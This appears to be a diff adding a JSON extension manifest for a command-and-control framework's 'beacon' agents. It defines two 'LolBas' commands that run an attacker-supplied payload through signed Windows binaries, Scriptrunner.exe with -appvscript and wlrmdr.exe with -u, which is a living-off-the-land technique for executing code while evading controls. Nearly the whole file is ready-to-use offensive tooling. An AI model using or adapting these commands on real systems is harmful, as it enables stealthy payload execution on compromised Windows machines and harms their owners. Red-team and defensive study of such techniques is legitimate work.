@@ -1,0 +1,32 @@
+{
+  "name": "LolBas",
+  "description": "LOLBAS File execution",
+  "extensions": [
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+
+      "command": "Lolbas-Scriptrunner",
+      "message": "",
+      "description": "Payload execution using Scriptrunner.exe # https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/",
+      "example": "Lolbas-Scriptrunner PAYLOAD",
+      "args": [
+        "STRING <payload> payload.exe"
+      ],
+      "exec": "powershell Scriptrunner.exe -appvscript {payload}"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+
+      "command": "Lolbas-wlrmdr",
+      "message": "",
+      "description": "Payload execution using Wlrmdr.exe # https://lolbas-project.github.io/lolbas/Binaries/Wlrmdr/",
+      "example": "Lolbas-wlrmdr PAYLOAD",
+      "args": [
+        "STRING <payload> payload.exe"
+      ],
+      "exec": "powershell wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {payload}"
+    }
+  ]
+}
